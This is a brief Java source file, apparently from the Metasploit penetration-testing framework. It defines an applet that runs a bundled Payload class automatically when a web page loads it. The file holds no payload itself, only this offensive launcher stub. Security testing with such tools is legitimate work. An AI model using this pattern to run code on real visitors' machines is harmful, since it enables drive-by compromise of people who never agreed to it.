
package metasploit;

import java.applet.*;

public class PayloadApplet extends Applet {
    @Override
    public void init() {
        try {
            Payload.main(null);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
